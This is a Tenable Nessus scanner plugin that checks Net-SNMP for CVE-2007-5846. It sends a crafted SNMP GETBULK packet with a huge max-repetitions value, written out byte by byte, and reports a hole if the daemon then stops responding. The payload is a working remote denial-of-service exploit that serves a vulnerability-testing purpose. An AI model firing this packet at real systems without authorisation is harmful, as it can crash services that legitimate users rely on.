#
#  (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(27841);
  script_version("$Revision: 1.7 $");

  script_cve_id("CVE-2007-5846");
  script_bugtraq_id(26378);
  script_xref(name:"OSVDB", value:"38904");

  script_name(english:"SNMP GETBULK Large max-repetitions Remote DoS");
  script_summary(english:"Sends a GETBULK request with large value for max-repetitions");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote SNMP daemon is susceptible to a denial of service attack." );
 script_set_attribute(attribute:"description", value:
"It is possible to disable the remote SNMP daemon by sending a GETBULK
request with a large value for 'max-repetitions'.  A remote attacker
may be able to leverage this issue to cause the daemon to consume
excessive memory and CPU on the affected system while it tries
unsuccessfully to process the request, thereby denying service to
legitimate users." );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?5aef7a73" );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?355da3c5" );
 script_set_attribute(attribute:"solution", value:
"Disable the SNMP service on the remote host if you do not use it. 
Otherwise, upgrade to version 5.4.1 or later if using Net-SNMP." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:C" );
script_end_attributes();

 
  script_category(ACT_DENIAL);
  script_family(english:"SNMP");
  script_copyright(english:"This script is Copyright (C) 2007-2009 Tenable Network Security, Inc.");
  script_dependencies("snmp_settings.nasl", "find_service2.nasl");
  script_require_keys("SNMP/community");

  exit(0);
}


include("snmp_func.inc");
include("misc_func.inc");


community = get_kb_item("SNMP/community");
if (!community) exit(0);

port = get_kb_item("SNMP/port");
if (!port) port = 161;

soc = open_sock_udp(port);
if (!soc) exit(0);


# Make sure we can request something, like sysDesc.
oid = "1.3.6.1.2.1.1.1.0";
desc = snmp_request(socket:soc, community:community, oid:oid);
if (isnull(desc)) exit(0);


# Send the exploit.
len = strlen(community);
len = len % 256;

boom = raw_string(
  0x30, 0x28, 0x02, 0x01, 
  0x00, 
  0x04, len, community, 
  0xa5, 0x1b,
    0x02, 0x04, 0x2f, 0x82, 0x2b, 0x93,  # request-id (797059987)
    0x02, 0x01, 0x00,                    # non-repeaters (0)
    0x02, 0x03, 0x03, 0xa9, 0x80,        # max-repetitions (240000)
    0x30, 0x0b, 
      0x30, 0x09, 
        0x06, 0x05, 0x2b, 0x06, 0x01, 0x02, 0x01, 
        0x05, 0x00
);
send(socket:soc, data:boom);


# There's a problem if our request no longer works.
desc = snmp_request(socket:soc, community:community, oid:oid);
if (isnull(desc)) security_hole(port:port, protocol:"udp");
